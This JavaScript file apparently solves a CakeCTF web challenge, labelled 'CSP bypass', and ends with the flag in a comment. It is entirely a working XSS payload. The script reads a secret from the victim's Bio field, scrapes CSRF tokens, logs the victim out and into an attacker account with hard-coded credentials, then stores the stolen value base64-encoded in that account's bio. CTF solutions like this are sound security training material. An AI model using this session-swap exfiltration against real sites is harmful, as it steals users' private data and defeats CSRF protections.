console.log("CSP bypass");

async function getData(url = '', data = {}) {
	// Default options are marked with *
	const response = await fetch(url, {
		method: 'GET', // *GET, POST, PUT, DELETE, etc.
		mode: 'cors', // no-cors, *cors, same-origin
		cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
		credentials: 'same-origin', // include, *same-origin, omit
		headers: {
			///'Content-Type': 'application/json'
		},
		redirect: 'follow', // manual, *follow, error
		referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
	});
	return response.text(); // parses JSON response into native JavaScript objects
}

async function postData(url = '', data = {}) {
	// Default options are marked with *
	const response = await fetch(url, {
		method: 'POST', // *GET, POST, PUT, DELETE, etc.
		mode: 'cors', // no-cors, *cors, same-origin
		cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
		credentials: 'same-origin', // include, *same-origin, omit
		headers: {
			///'Content-Type': 'application/json'
			'Content-Type': 'application/x-www-form-urlencoded',
		},
		redirect: 'follow', // manual, *follow, error
		referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
		body: data // body data type must match "Content-Type" header
	});
	return response; // parses JSON response into native JavaScript objects
}

fetch('/').then(e => e.text()).then(html => {
	let needle1 = ' placeholder="Bio">';
	let n1Id = html.indexOf(needle1);
	let n2Id = html.indexOf('</textarea>');
	let textareaContent = html.substr(n1Id+needle1.length, n2Id - n1Id-needle1.length).trim();
	let stolenFlag = textareaContent;
	let csrf = html.matchAll(/value="(.*)"/g);
	csrf = [...csrf][0][1]
	postData('/api/user/logout', 'csrf_token='+csrf).then(e => {
		getData('/').then(html2 => {
			let csrf = html2.matchAll(/value="(.*)"/g);
			csrf = [...csrf][0][1]
			return postData('/api/user/login', 'username=demo2&password=demo1234&csrf_token='+csrf).then(e => {
				getData('/').then(html3 => {
					let csrf = html3.matchAll(/value="(.*)"/g);
					csrf = [...csrf][0][1]
					postData('/api/user/update', 'bio='+btoa(stolenFlag)+'&csrf_token='+csrf).then(e => {console.log('done')});
				});
			})
		});
	});
});

//CakeCTF{httponly=true_d03s_n0t_pr0t3ct_U_1n_m4ny_c4s3s!}
